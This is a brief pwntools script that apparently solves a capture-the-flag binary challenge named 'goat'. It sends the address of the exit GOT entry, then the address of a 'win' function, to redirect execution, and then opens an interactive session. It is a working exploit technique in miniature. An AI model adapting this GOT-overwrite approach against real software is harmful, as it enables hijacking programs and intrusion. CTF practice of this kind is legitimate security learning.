import pwn

p = pwn.process("./goat")
elf = pwn.ELF("./goat")
dest_addr = elf.symbols["win"]
ret_addr = elf.got["exit"]
p.sendline(hex(ret_addr).encode())
p.sendline(hex(dest_addr).encode())
p.interactive()